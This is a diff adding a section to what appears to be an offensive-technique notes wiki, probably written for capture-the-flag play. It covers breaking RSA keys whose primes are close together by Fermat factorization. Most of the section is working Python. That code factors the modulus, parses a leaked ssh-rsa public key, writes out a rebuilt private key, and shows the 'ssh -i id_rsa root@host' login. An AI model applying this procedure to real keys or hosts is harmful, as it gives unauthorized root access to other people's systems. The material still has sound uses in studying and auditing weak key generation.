@@ -172,3 +172,46 @@ Same idea breaks any home-rolled signed IPC/C2/token scheme whose key lives in a
 See [[insecure-randomness]] for predicting a *live* (non-seeded) PRNG stream instead.
 
 <!-- promoted-slug: binary-signed-protocol-forge -->
+
+## Fermat factorization (near-equal primes)
+
+A deprecated/weak keygen library can pick p and q very close together. Then n factors from the
+public key alone in ~one iteration (a starts at ceil(sqrt(n)) and lands on the answer immediately):
+
+```python
+from math import isqrt, lcm
+a = isqrt(n) + 1
+while True:
+    b2 = a*a - n
+    b = isqrt(b2)
+    if b*b == b2:
+        break
+    a += 1
+p, q = a + b, a - b          # p*q == n
+d = pow(e, -1, lcm(p-1, q-1))
+```
+
+`RsaCtfTool --publickey key.pem` includes this (fermat) among its attacks; the loop above is the
+manual version and is instant when p ~ q.
+
+### Applied: recover an SSH login key from a leaked `id_rsa.pub`
+
+A leaked *public* key is enough when the primes are Fermat-weak. Parse `n,e` from the ssh-rsa wire
+format (`string "ssh-rsa"`, mpint e, mpint n), factor, then rebuild the private half and log in:
+
+```python
+import base64, struct
+from Crypto.PublicKey import RSA
+blob = base64.b64decode(open("id_rsa.pub").read().split()[1])
+o=0
+def rd():
+    global o; l=struct.unpack(">I",blob[o:o+4])[0]; o+=4; v=blob[o:o+l]; o+=l; return v
+rd(); e=int.from_bytes(rd(),"big"); n=int.from_bytes(rd(),"big")   # skip "ssh-rsa", then e, n
+# ...Fermat as above...
+open("id_rsa","wb").write(RSA.construct((n,e,d,p,q)).export_key("PEM"))
+# chmod 600 id_rsa && ssh -i id_rsa root@host   (works if root SSH login is enabled)
+```
+
+Tell: two near-identical primes -> `p - q` is tiny (a few thousand). Key length = `n.bit_length()`.
+
+<!-- promoted-slug: rsa-fermat-close-primes -->
